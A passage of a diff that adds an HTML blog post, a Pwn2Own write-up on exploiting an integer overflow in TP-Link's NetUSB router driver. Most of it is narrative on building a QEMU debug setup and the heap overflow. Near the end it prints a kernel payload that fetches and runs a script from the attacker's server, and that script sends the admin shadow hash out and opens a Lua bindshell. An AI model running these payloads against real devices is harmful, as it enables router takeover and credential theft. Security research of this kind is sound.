+  <span class="n">v5</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="n">kc_dbgD_send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span> <span class="c1">// &lt;-- send over socket</span>
+  <span class="k">return</span> <span class="n">printk</span><span class="p">(</span><span class="s">&quot;&lt;1&gt;%s&quot;</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>Pretty funny right?</p>
+<h1 id="booting-netusb-in-qemu">Booting NetUSB in QEMU</h1>
+<p>Although I had a root shell on the device, I wasn't able to debug the kernel or the driver's code. This made it very hard to even think about exploiting this vulnerability. On top of that, I am a complete Linux noob so this lack of introspections wasn't going to work. What are my options?</p>
+<p>Well, as I mentioned earlier TP-Link is maintaining a GPL archive which has information on the Linux version they use, the patches they apply and supposedly everything necessary to build a kernel. I thought that was extremely nice of them and that it should give me a good starting point to be able to debug this driver under QEMU. I knew this wouldn't give me the most precise simulation environment but, at the same time, it would be a vast improvement with my current situation. I would be able to hook-up GDB, inspect the allocator state, and hopefully make progress.</p>
+<p>Turns out this was much harder than I thought. I started by trying to build the kernel via the GPL archive. In appearance, everything is there and a simple make should just work. But that didn't cut it. It took me weeks to actually get it to compile (right dependencies, patching bits here and there, ...), but I eventually did it. I had to try a bunch of toolchain versions, fix random files that would lead to errors on my Linux distribution, etc. To be honest I mostly forgot all the details here but I remember it being painful. If you are interested, I have zipped up the filesystem of this VM and you can find it here: <a href="https://github.com/0vercl0k/zenith/releases/download/v0/wheezy-openwrt-ath.tar.xz">wheezy-openwrt-ath.tar.xz</a>.</p>
+<p>I thought this was the end of my suffering but it was in fact not it. At all. The built kernel wouldn't boot in QEMU and would hang at boot time. I tried to understand what was going on, but it looked related to the emulated hardware and I was honestly out of my depth. I decided to look at the problem from a different angle. Instead, I downloaded a <a href="https://www.aurel32.net/info/debian_mips_qemu.php">Linux MIPS QEMU image</a> from <a href="https://www.aurel32.net/info/debian_mips_qemu.php">aurel32's website</a> that was booting just fine, and decided that I would try to merge both of the kernel configurations until I end up with a bootable image that has a configuration as close as possible from the kernel running on the device. Same kernel version, allocators, same drivers, etc. At least similar enough to be able to load the <code>NetUSB.ko</code> driver.</p>
+<p>Again, because I am a complete Linux noob I failed to really see the complexity there. So I got started on this journey where I must have compiled easily 100+ kernels until being able to load and execute the <code>NetUSB.ko</code> driver in QEMU. The main challenge that I failed to see was that in Linux land, configuration flags can change the size of internal structures. This means that if you are trying to run a driver A on kernel B, the driver A might mistake a structure to be of size C when it is in fact of size D. That's exactly what happened. Starting the driver in this QEMU image led to a ton of random crashes that I couldn't really explain at first. So I followed multiple rabbit holes until realizing that my kernel configuration was just not in agreement with what the driver expected. For example, the <a href="https://elixir.bootlin.com/linux/v3.3.8/source/include/linux/netdevice.h#L1016">net_device</a> defined below shows that its definition varies depending on kernel configuration options being on or off: <code>CONFIG_WIRELESS_EXT</code>, <code>CONFIG_VLAN_8021Q</code>, <code>CONFIG_NET_DSA</code>, <code>CONFIG_SYSFS</code>, <code>CONFIG_RPS</code>, <code>CONFIG_RFS_ACCEL</code>, etc. But that's not all. Any types used by this structure can do the same which means that looking at the main definition of a structure is not enough.</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="n">net_device</span> <span class="p">{</span>
+<span class="c1">// ...</span>
+<span class="cp">#ifdef CONFIG_WIRELESS_EXT</span>
+  <span class="cm">/* List of functions to handle Wireless Extensions (instead of ioctl).</span>
+<span class="cm">   * See &lt;net/iw_handler.h&gt; for details. Jean II */</span>
+  <span class="k">const</span> <span class="k">struct</span> <span class="n">iw_handler_def</span> <span class="o">*</span> <span class="n">wireless_handlers</span><span class="p">;</span>
+  <span class="cm">/* Instance data managed by the core of Wireless Extensions. */</span>
+  <span class="k">struct</span> <span class="n">iw_public_data</span> <span class="o">*</span> <span class="n">wireless_data</span><span class="p">;</span>
+<span class="cp">#endif</span>
+<span class="c1">// ...</span>
+<span class="cp">#if IS_ENABLED(CONFIG_VLAN_8021Q)</span>
+  <span class="k">struct</span> <span class="n">vlan_info</span> <span class="n">__rcu</span>  <span class="o">*</span><span class="n">vlan_info</span><span class="p">;</span> <span class="cm">/* VLAN info */</span>
+<span class="cp">#endif</span>
+<span class="cp">#if IS_ENABLED(CONFIG_NET_DSA)</span>
+  <span class="k">struct</span> <span class="n">dsa_switch_tree</span>  <span class="o">*</span><span class="n">dsa_ptr</span><span class="p">;</span> <span class="cm">/* dsa specific data */</span>
+<span class="cp">#endif</span>
+<span class="c1">// ...</span>
+<span class="cp">#ifdef CONFIG_SYSFS</span>
+  <span class="k">struct</span> <span class="n">kset</span>   <span class="o">*</span><span class="n">queues_kset</span><span class="p">;</span>
+<span class="cp">#endif</span>
+
+<span class="cp">#ifdef CONFIG_RPS</span>
+  <span class="k">struct</span> <span class="n">netdev_rx_queue</span>  <span class="o">*</span><span class="n">_rx</span><span class="p">;</span>
+
+  <span class="cm">/* Number of RX queues allocated at register_netdev() time */</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">num_rx_queues</span><span class="p">;</span>
+
+  <span class="cm">/* Number of RX queues currently active in device */</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">real_num_rx_queues</span><span class="p">;</span>
+
+<span class="cp">#ifdef CONFIG_RFS_ACCEL</span>
+  <span class="cm">/* CPU reverse-mapping for RX completion interrupts, indexed</span>
+<span class="cm">   * by RX queue number.  Assigned by driver.  This must only be</span>
+<span class="cm">   * set if the ndo_rx_flow_steer operation is defined. */</span>
+  <span class="k">struct</span> <span class="n">cpu_rmap</span>   <span class="o">*</span><span class="n">rx_cpu_rmap</span><span class="p">;</span>
+<span class="cp">#endif</span>
+<span class="cp">#endif</span>
+<span class="c1">//...</span>
+<span class="p">};</span>
+</code></pre></div>
+
+
+<p>Once I figured that out, I went through a pretty lengthy process of trial and error. I would start the driver, get information about the crash and try to look at the code / structures involved and see if a kernel configuration option would impact the layout of a relevant structure. From there, I could see the difference between the kernel configuration for my bootable QEMU image and the kernel I had built from the GPL and see where were mismatches. If there was one, I could simply turn the option on or off, recompile and hope that it doesn't make the kernel unbootable under QEMU.</p>
+<p>After at least 136 compilations (the number of times I found <code>make ARCH=mips</code> in one of my <code>.bash_history</code> 😅) and an enormous amount of frustration, I eventually built a Linux kernel version able to run <code>NetUSB.ko</code> 😲:</p>
+<div class="highlight"><pre><span></span><code>over@panther:~/pwn2own$ qemu-system-mips -m 128M -nographic -append <span class="s2">&quot;root=/dev/sda1 mem=128M&quot;</span> -kernel linux338.vmlinux.elf -M malta -cpu 74Kf -s -hda debian_wheezy_mips_standard.qcow2 -net nic,netdev<span class="o">=</span>network0 -netdev user,id<span class="o">=</span>network0,hostfwd<span class="o">=</span>tcp:127.0.0.1:20005-10.0.2.15:20005,hostfwd<span class="o">=</span>tcp:127.0.0.1:33344-10.0.2.15:33344,hostfwd<span class="o">=</span>tcp:127.0.0.1:31337-10.0.2.15:31337
+<span class="o">[</span>...<span class="o">]</span>
+root@debian-mips:~# ./start.sh
+<span class="o">[</span>   <span class="m">89</span>.092000<span class="o">]</span> new slab @ <span class="m">86964000</span>
+<span class="o">[</span>   <span class="m">89</span>.108000<span class="o">]</span> kcg <span class="m">333</span> :GPL NetUSB up!
+<span class="o">[</span>   <span class="m">89</span>.240000<span class="o">]</span> NetUSB: module license <span class="s1">&#39;Proprietary&#39;</span> taints kernel.
+<span class="o">[</span>   <span class="m">89</span>.240000<span class="o">]</span> Disabling lock debugging due to kernel taint
+<span class="o">[</span>   <span class="m">89</span>.268000<span class="o">]</span> kc   <span class="m">90</span> : run_telnetDBGDServer start
+<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> kc  <span class="m">227</span> : init_DebugD end
+<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17F8: NetUSB <span class="m">1</span>.02.69, <span class="m">00030308</span> : Jun <span class="m">11</span> <span class="m">2015</span> <span class="m">18</span>:15:00
+<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17FA: <span class="m">7437</span>: Archer C7    :Archer C7
+<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17FB:  AUTH ISOC
+<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> INFO17FC:  filterAudio
+<span class="o">[</span>   <span class="m">89</span>.272000<span class="o">]</span> usbcore: registered new interface driver KC NetUSB General Driver
+<span class="o">[</span>   <span class="m">89</span>.276000<span class="o">]</span> INFO0145:  init proc : PAGE_SIZE <span class="m">4096</span>
+<span class="o">[</span>   <span class="m">89</span>.280000<span class="o">]</span> INFO16EC:  infomap 869c6e38
+<span class="o">[</span>   <span class="m">89</span>.280000<span class="o">]</span> INFO16EF:  sleep to <span class="nb">wait</span> eth0 to wake up
+<span class="o">[</span>   <span class="m">89</span>.280000<span class="o">]</span> INFO15BF: tcpConnector<span class="o">()</span> started... : eth0
+NetUSB <span class="m">160207</span> <span class="m">0</span> - Live 0x869c0000 <span class="o">(</span>P<span class="o">)</span>
+GPL_NetUSB <span class="m">3409</span> <span class="m">1</span> NetUSB, Live 0x8694f000
+root@debian-mips:~# <span class="o">[</span>   <span class="m">92</span>.308000<span class="o">]</span> INFO1572: Bind to eth0
+</code></pre></div>
+
+
+<p>For the readers that would like to do the same, here are some technical details that they might find useful (I probably forgot most of the other ones):
+- I used <code>debootstrap</code> to easily be able to install older Linux distributions until one worked fine with package dependencies, older libc, etc. I used a Debian Wheezy (7.11) distribution to build the GPL code from TP-Link as well as cross-compiling the kernel. I uploaded archives of those two systems: <a href="https://github.com/0vercl0k/zenith/releases/download/v0/wheezy-openwrt-ath.tar.xz">wheezy-openwrt-ath.tar.xz</a> and <a href="https://github.com/0vercl0k/zenith/releases/download/v0/wheezy-compile-kernel.tar.xz">wheezy-compile-kernel.tar.xz</a>. You should be able to extract those on a regular Ubuntu Intel x64 VM and <code>chroot</code> in those folders and <strong>SHOULD</strong> be able to reproduce what I described. Or at least, be very close from reproducing.
+- I cross compiled the kernel using the following toolchain: <code>toolchain-mips_r2_gcc-4.6-linaro_uClibc-0.9.33.2</code> (<code>gcc (Linaro GCC 4.6-2012.02) 4.6.3 20120201 (prerelease)</code>). I used the following command to compile the kernel: <code>$ make ARCH=mips CROSS_COMPILE=/home/toolchain-mips_r2_gcc-4.6-linaro_uClibc-0.9.33.2/bin/mips-openwrt-linux- -j8 vmlinux</code>. You can find the toolchain in <a href="https://github.com/0vercl0k/zenith/releases/download/v0/wheezy-openwrt-ath.tar.xz">wheezy-openwrt-ath.tar.xz</a> which is downloaded / compiled from the GPL code, or you can grab the binaries directly off <a href="https://github.com/0vercl0k/zenith/releases/download/v0/wheezy-compile-kernel.tar.xz">wheezy-compile-kernel.tar.xz</a>.
+- You can find the command line I used to start QEMU in <a href="https://github.com/0vercl0k/zenith/blob/main/misc/start_qemu.sh">start_qemu.sh</a> and <a href="https://github.com/0vercl0k/zenith/blob/main/misc/dbg.sh">dbg.sh</a> to attach GDB to the kernel.</p>
+<h1 id="enters-zenith">Enters Zenith</h1>
+<p>Once I was able to attach GDB to the kernel I finally had an environment where I could get as much introspection as I needed. Note that because of all the modifications I had done to the kernel config, I didn't really know if it would be possible to port the exploit to the real target. But I also didn't have an exploit at the time, so I figured this would be another problem to solve later if I even get there.</p>
+<p>I started to read a lot of code, documentation and papers about Linux kernel exploitation. The linux kernel version was old enough that it didn't have a bunch of more recent mitigations. This gave me some hope. I spent quite a bit of time trying to exploit the overflow from above. In <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">Exploiting the Linux kernel via packet sockets</a> <a href="https://twitter.com/andreyknvl">Andrey Konovalov</a> describes in details an attack that looked like could work for the bug I had found. Also, read the article as it is both well written and fascinating. The overall idea is that kmalloc internally uses the buddy allocator to get pages off the kernel and as a result, we might be able to place the buddy page that we can overflow right before pages used to store a kmalloc slab. If I remember correctly, my strategy was to drain the order 0 freelist (blocks of memory that are 0x1000 bytes) which would force blocks from the higher order to be broken down to feed the freelist. I imagined that a block from the order 1 freelist could be broken into 2 chunks of 0x1000 which would mean I could get a 0x1000 block adjacent to another 0x1000 block that could be now used by a kmalloc-1024 slab. I struggled and tried a lot of things and never managed to pull it off. I remember the bug had a few annoying things I hadn't realized when finding it, but I am sure a more experienced Linux kernel hacker could have written an exploit for this bug.</p>
+<p>I thought, oh well. Maybe there's something better. Maybe I should focus on looking for a similar bug but in a kmalloc'd region as I wouldn't have to deal with the same problems as above. I would still need to worry about being able to place the buffer adjacent to a juicy corruption target though. After looking around for a bit longer I found another integer overflow:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="o">*</span><span class="nf">SoftwareBus_dispatchNormalEPMsgOut</span><span class="p">(</span><span class="n">SbusConnection_t</span> <span class="o">*</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="kt">char</span> <span class="n">HostCommand</span><span class="p">,</span> <span class="kt">char</span> <span class="n">Opcode</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">// ...</span>
+  <span class="k">switch</span> <span class="p">(</span><span class="n">OpcodeMasked</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="mh">0x50</span><span class="o">:</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">ReceiveBuffer</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="p">{</span>
+          <span class="n">ReceivedSize</span> <span class="o">=</span> <span class="n">_bswapw</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">ReceiveBuffer</span><span class="p">);</span>
+            <span class="n">AllocatedBuffer</span> <span class="o">=</span> <span class="n">_kmalloc</span><span class="p">(</span><span class="n">ReceivedSize</span> <span class="o">+</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">208</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">AllocatedBuffer</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="n">kc_printf</span><span class="p">(</span><span class="s">&quot;INFO%04X: Out of memory in USBSoftwareBus&quot;</span><span class="p">,</span> <span class="mi">4296</span><span class="p">);</span>
+            <span class="p">}</span>
+  <span class="c1">// ...</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SoftwareBus_fillBuf</span><span class="p">(</span><span class="n">SbusConnection</span><span class="p">,</span> <span class="n">AllocatedBuffer</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">ReceivedSize</span><span class="p">))</span>
+</code></pre></div>
+
+
+<p>Cool. But at this point, I was a bit out of my depth. I was able to overflow kmalloc-128 but didn't really know what type of useful objects I would be able to put there from over the network. After a bunch of trial and error I started to notice that if I was taking a small pause after the allocation of the buffer but before overflowing it, an interesting structure would be magically allocated fairly close from my buffer. To this day, I haven't fully debugged where it exactly came from but as this was my only lead I went along with it.</p>
+<p>The target kernel doesn't have ASLR and doesn't have NX, so my exploit is able to hardcode addresses and execute the heap directly which was nice. I can also place arbitrary data in the heap using the various allocation functions I had reverse-engineered earlier. For example, triggering a 3MB large allocation always returned a fixed address where I could stage content. To get this address, I simply patched the driver binary to output the address on the real device after the allocation as I couldn't debug it.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># (gdb) x/10dwx 0xffffffff8522a000</span>
+<span class="c1"># 0x8522a000:     0xff510000      0x1000ffff      0xffff4433      0x22110000</span>
+<span class="c1"># 0x8522a010:     0x0000000d      0x0000000d      0x0000000d      0x0000000d</span>
+<span class="c1"># 0x8522a020:     0x0000000d      0x0000000d</span>
+<span class="n">addr_payload</span> <span class="o">=</span> <span class="mh">0x83c00000</span> <span class="o">+</span> <span class="mh">0x10</span>
+
+<span class="c1"># ...</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">stdscr</span><span class="p">):</span>
+  <span class="c1"># ...</span>
+  <span class="c1"># Let&#39;s get to business.</span>
+  <span class="n">_3mb</span> <span class="o">=</span> <span class="mi">3</span> <span class="o">*</span> <span class="mi">1_024</span> <span class="o">*</span> <span class="mi">1_024</span>
+  <span class="n">payload_sprayer</span> <span class="o">=</span> <span class="n">SprayerThread</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="s1">&#39;payload sprayer&#39;</span><span class="p">)</span>
+  <span class="n">payload_sprayer</span><span class="o">.</span><span class="n">set_length</span><span class="p">(</span><span class="n">_3mb</span><span class="p">)</span>
+  <span class="n">payload_sprayer</span><span class="o">.</span><span class="n">set_spray_content</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+  <span class="n">payload_sprayer</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+  <span class="n">leaker</span><span class="o">.</span><span class="n">wait_for_one</span><span class="p">()</span>
+  <span class="n">sprayers</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">payload_sprayer</span><span class="p">)</span>
+  <span class="n">log</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Payload placed @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr_payload</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+  <span class="n">y</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre></div>
+
+
+<p>My final exploit, <a href="https://github.com/0vercl0k/zenith">Zenith</a>, overflows an adjacent <code>wait_queue_head_t.head.next</code> structure that is placed by the socket stack of the Linux kernel with the address of a crafted <code>wait_queue_entry_t</code> under my control (<code>Trasher</code> class in the exploit code). This is the definition of the structure:</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="n">wait_queue_head</span> <span class="p">{</span>
+  <span class="n">spinlock_t</span>    <span class="n">lock</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">list_head</span>  <span class="n">head</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">wait_queue_entry</span> <span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">flags</span><span class="p">;</span>
+  <span class="kt">void</span>      <span class="o">*</span><span class="n">private</span><span class="p">;</span>
+  <span class="n">wait_queue_func_t</span> <span class="n">func</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">list_head</span>  <span class="n">entry</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+
+
+<p>This structure has a function pointer, <code>func</code>, that I use to hijack the execution and redirect the flow to a fixed location, in a large kernel heap chunk where I previously staged the payload (<code>0x83c00000</code> in the exploit code). The function invoking the <code>func</code> function pointer is <code>__wake_up_common</code> and you can see its code below:</p>
+<div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">__wake_up_common</span><span class="p">(</span><span class="n">wait_queue_head_t</span> <span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span>
+      <span class="kt">int</span> <span class="n">nr_exclusive</span><span class="p">,</span> <span class="kt">int</span> <span class="n">wake_flags</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">wait_queue_t</span> <span class="o">*</span><span class="n">curr</span><span class="p">,</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+
+  <span class="n">list_for_each_entry_safe</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span> <span class="n">next</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task_list</span><span class="p">,</span> <span class="n">task_list</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">curr</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">curr</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="n">curr</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">wake_flags</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+        <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">WQ_FLAG_EXCLUSIVE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!--</span><span class="n">nr_exclusive</span><span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>This is what it looks like in GDB once <code>q-&gt;head.next/prev</code> has been corrupted:</p>
+<div class="highlight"><pre><span></span><code>(gdb) break *__wake_up_common+0x30 if ($v0 &amp; 0xffffff00) == 0xdeadbe00
+
+(gdb) break sock_recvmsg if msg-&gt;msg_iov[0].iov_len == 0xffffffff
+
+(gdb) c
+Continuing.
+sock_recvmsg(dst=0xffffffff85173390)
+
+Breakpoint 2, __wake_up_common (q=0x85173480, mode=1, nr_exclusive=1, wake_flags=1, key=0xc1)
+    at kernel/sched/core.c:3375
+3375    kernel/sched/core.c: No such file or directory.
+
+(gdb) p *q
+$1 = {lock = {{rlock = {raw_lock = {&lt;No data fields&gt;}}}}, task_list = {next = 0xdeadbee1,
+    prev = 0xbaadc0d1}}
+
+(gdb) bt
+#0  __wake_up_common (q=0x85173480, mode=1, nr_exclusive=1, wake_flags=1, key=0xc1)
+    at kernel/sched/core.c:3375
+#1  0x80141ea8 in __wake_up_sync_key (q=&lt;optimized out&gt;, mode=&lt;optimized out&gt;,
+    nr_exclusive=&lt;optimized out&gt;, key=&lt;optimized out&gt;) at kernel/sched/core.c:3450
+#2  0x8045d2d4 in tcp_prequeue (skb=0x87eb4e40, sk=0x851e5f80) at include/net/tcp.h:964
+#3  tcp_v4_rcv (skb=0x87eb4e40) at net/ipv4/tcp_ipv4.c:1736
+#4  0x8043ae14 in ip_local_deliver_finish (skb=0x87eb4e40) at net/ipv4/ip_input.c:226
+#5  0x8040d640 in __netif_receive_skb (skb=0x87eb4e40) at net/core/dev.c:3341
+#6  0x803c50c8 in pcnet32_rx_entry (entry=&lt;optimized out&gt;, rxp=0xa0c04060, lp=0x87d08c00,
+    dev=0x87d08800) at drivers/net/ethernet/amd/pcnet32.c:1199
+#7  pcnet32_rx (budget=16, dev=0x87d08800) at drivers/net/ethernet/amd/pcnet32.c:1212
+#8  pcnet32_poll (napi=0x87d08c5c, budget=16) at drivers/net/ethernet/amd/pcnet32.c:1324
+#9  0x8040dab0 in net_rx_action (h=&lt;optimized out&gt;) at net/core/dev.c:3944
+#10 0x801244ec in __do_softirq () at kernel/softirq.c:244
+#11 0x80124708 in do_softirq () at kernel/softirq.c:293
+#12 do_softirq () at kernel/softirq.c:280
+#13 0x80124948 in invoke_softirq () at kernel/softirq.c:337
+#14 irq_exit () at kernel/softirq.c:356
+#15 0x8010198c in ret_from_exception () at arch/mips/kernel/entry.S:34
+</code></pre></div>
+
+
+<p>Once the <code>func</code> pointer is invoked, I get control over the execution flow and I execute a <a href="https://github.com/0vercl0k/zenith/blob/main/src/sh.remote.asm">simple kernel payload</a> that leverages <code>call_usermodehelper_setup</code> / <code>call_usermodehelper_exec</code> to execute user mode commands as root. It pulls a shell script off a listening HTTP server on the attacker machine and executes it.</p>
+<div class="highlight"><pre><span></span><code>arg0: .asciiz &quot;/bin/sh&quot;
+arg1: .asciiz &quot;-c&quot;
+arg2: .asciiz &quot;wget http://{ip_local}:8000/pwn.sh &amp;&amp; chmod +x pwn.sh &amp;&amp; ./pwn.sh&quot;
+argv: .word arg0
+      .word arg1
+      .word arg2
+envp: .word 0
+</code></pre></div>
+
+
+<p>The <a href="https://github.com/0vercl0k/zenith/blob/main/src/pwn_base.sh">pwn.sh</a> shell script simply leaks the <code>admin</code>'s <code>shadow</code> hash, and opens a bindshell (cheers to <a href="https://twitter.com/swapgs">Thomas Chauchefoin</a> and <a href="https://twitter.com/0xMitsurugi">Kevin Denis</a> for the Lua oneliner) the attacker can connect to (if the kernel hasn't crashed yet 😳):</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/sh</span>
+<span class="nb">export</span> <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span>
+wget http://<span class="o">{</span>ip_local<span class="o">}</span>:8000/pwd?<span class="k">$(</span>grep -E admin: /etc/shadow<span class="k">)</span>
+lua -e <span class="s1">&#39;local k=require(&quot;socket&quot;);</span>
+<span class="s1">  local s=assert(k.bind(&quot;*&quot;,os.getenv(&quot;LPORT&quot;)));</span>
+<span class="s1">  local c=s:accept();</span>
+<span class="s1">  while true do</span>
+<span class="s1">    local r,x=c:receive();local f=assert(io.popen(r,&quot;r&quot;));</span>
+<span class="s1">    local b=assert(f:read(&quot;*a&quot;));c:send(b);</span>
+<span class="s1">  end;c:close();f:close();&#39;</span>
+</code></pre></div>
+
+
+<p>The exploit also uses the debug interface that I mentioned earlier as it leaks kernel-mode pointers and is overall useful for basic synchronization (cf the <code>Leaker</code> class).</p>
+<p>OK at that point, it works in QEMU... which is pretty wild. Never thought it would. Ever. What's also wild is that I am still in time for the Pwn2Own registration, so maybe this is also possible 🤔. Reliability wise, it worked well enough on the QEMU environment: about 3 times about 5 I would say. Good enough.</p>
+<p>I started to port over the exploit to the real device and to my surprise it also worked there as well. The reliability was poorer but I was impressed that it still worked. Crazy. Especially with both the hardware and the kernel being different! As I still wasn't able to debug the target's kernel I was left with <code>dmesg</code> outputs to try to make things better. Tweak the spray here and there, try to go faster or slower; trying to find a magic combination. In the end, I didn't find anything magic; the exploit was unreliable but hey I only needed it to land once on stage 😅. This is what it looks like when the stars align 💥:</p>
+<p><center><img src="/images/pwn2own_austin_2021/zenith.gif" width=100%></img></center></p>
+<p>Beautiful. Time to register!</p>
+<h1 id="entering-the-contest">Entering the contest</h1>
+<p>As the contest was fully remote (bummer!) because of COVID-19, contestants needed to provide exploits and documentation prior to the contest. Fully remote meant that the ZDI stuff would throw our exploits on the environment they had set-up.</p>
+<p>At that point we had two exploits and that's what we registered for. Right after receiving confirmation from ZDI, I noticed that TP-Link pushed an update for the router 😳. I thought Damn. I was at work when I saw the news and was stressed about the bug getting killed. Or worried that the update could have changed anything that my exploit was relying on: the kernel, etc. I finished my day at work and pulled down the firmware from the website. I checked the release notes while the archive was downloading but it didn't have any hints suggesting that they had updated either NetUSB or the kernel which was.. good. I extracted the file off the firmware file with <code>binwalk</code> and quickly verified the <code>NetUSB.ko</code> file. I grabbed a hash and ... it was the same. Wow. What a relief 😮‍💨.</p>
+<p>When the time of demonstrating my exploit came, it unfortunately didn't land in the three attempts which was a bit frustrating. Although it was frustrating, I knew from the beginning that my odds weren't the best entering the contest. I remembered that I originally didn't even think that I'd be able to compete and so I took this experience as a win on its own.</p>
+<p>On the bright side, my teammates were real pros and landed their exploits which was awesome to see 🍾🏆.</p>
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>Participating in Pwn2Own had been on my todo list for the longest time so seeing that it could be done felt great. I also learned a lot of lessons while doing it:</p>
+<ul>
+<li>Attacking the kernel might be cool, but it is an absolute pain to debug / set-up an environment. I probably would not go that route again if I was doing it again.</li>
+<li>Vendor patching bugs at the last minute can be stressful and is really not fun. My teammate got their first exploit killed by an update which was annoying. Fortunately, they were able to find another vulnerability and this one stayed alive.</li>
+<li>Getting a root shell on the device ASAP is a good idea. I initially tried to find a post auth vulnerability statically to get a root shell but that was wasted time.</li>
+<li>The Ghidra disassembler decompiles MIPS32 code pretty well. It wasn't perfect but a net positive.</li>
+<li>I also realized later that the same driver was running on the Netgear router and was reachable from the WAN port. I wasn't in it for the money but maybe it would be good for me to do a better job at taking a look at more than a target instead of directly diving deep into one exclusively.</li>
+<li>The ZDI team is awesome. They are rooting for you and want you to win. No, really. Don't hesitate to reach out to them with questions.</li>
+<li>Higher payouts don't necessarily mean a harder target.</li>
+</ul>
+<p>You can find all the code and scripts in the <a href="https://github.com/0vercl0k/zenith">zenith</a> Github repository. If you want to read more about NetUSB here are a few more references:</p>
+<ul>
+<li><a href="https://haxx.in/files/blasty-vs-netusb.py">CVE-2015-3036 - NetUSB Remote Code Execution exploit (Linux/MIPS) - blasty-vs-netusb.py</a> by <a href="https://twitter.com/bl4sty">bl4sty</a></li>
+<li><a href="https://www.sentinelone.com/labs/cve-2021-45608-netusb-rce-flaw-in-millions-of-end-user-routers/">CVE-2021-45608 | NetUSB RCE Flaw in Millions of End User Routers</a> by <a href="https://twitter.com/maxpl0it">maxpl0it</a></li>
+</ul>
+<p>I hope you enjoyed the post and I'll see you next time 😊! Special thanks to my boi <a href="https://twitter.com/yrp604">yrp604</a> for coming up with the title and thanks again to both <a href="https://twitter.com/yrp604">yrp604</a> and <a href="https://twitter.com/__x86">__x86</a> for proofreading this article 🙏🏽.</p>
+<p>Oh, and come hangout on <a href="https://discord.gg//4JBWKDNyYs">Diary of reverse-engineering's Discord server</a> with us!</p>
+                </div><!-- /.entry-content -->
+        </article>
+</section>
+        </div><!--/span-->
+      </div><!--/row-->
+      <hr>
+
+      <footer style='background-color:#00000000'>
+        <center>
+          <address id="about">
+                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
+                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
+          </address><!-- /#about -->
+
